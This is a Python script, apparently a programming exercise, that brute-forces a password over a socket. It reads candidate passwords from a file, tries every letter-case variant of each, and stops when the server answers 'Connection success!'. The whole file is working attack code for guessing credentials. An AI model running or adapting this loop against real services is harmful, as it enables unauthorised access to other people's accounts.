import socket
import sys
import os
from itertools import product

ip_address = sys.argv[1]
port = sys.argv[2]


class Socket:
    def __init__(self):
        self.sock = socket.socket()

    def connect(self, host, port):
        self.sock.connect((host, port))

    def send(self, message):
        self.sock.send(message.encode())

    def receive(self):
        return self.sock.recv(1024)

    def check_password(self):
        with open(f'{os.getcwd()}\\passwords.txt', 'r') as file:
            passwords = file.read().splitlines()
            for password in passwords:
                message_generator = list(map(lambda x: ''.join(x),
                                             product(*([letter.lower(), letter.upper()] for letter in password))))

                for message in message_generator:
                    self.sock.send(''.join(message).encode())
                    if self.receive().decode('utf-8') == "Connection success!":
                        return ''.join(message)

    def close_conn(self):
        self.sock.close()


def main():
    sock = Socket()
    sock.connect(ip_address, int(port))
    print(sock.check_password())
    sock.close_conn()


if __name__ == '__main__':
    main()
